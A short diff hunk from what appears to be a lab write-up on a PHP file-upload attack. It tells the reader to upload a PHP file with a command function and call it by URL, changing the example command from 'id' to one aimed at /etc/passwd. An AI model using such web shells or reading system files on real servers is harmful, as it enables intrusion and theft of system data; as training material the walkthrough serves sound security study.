@@ -13,4 +13,5 @@ a. Create a file with php function (for e.g. cmd):
 ?>
 
 2. Run the url with cmd, for e.g.:
-http://ptl-f04cf96b-a06904be.libcurl.so/upload/upload.php?cmd=id
+http://ptl-f04cf96b-a06904be.libcurl.so/upload/upload.php?cmd=+/etc/passwd
+
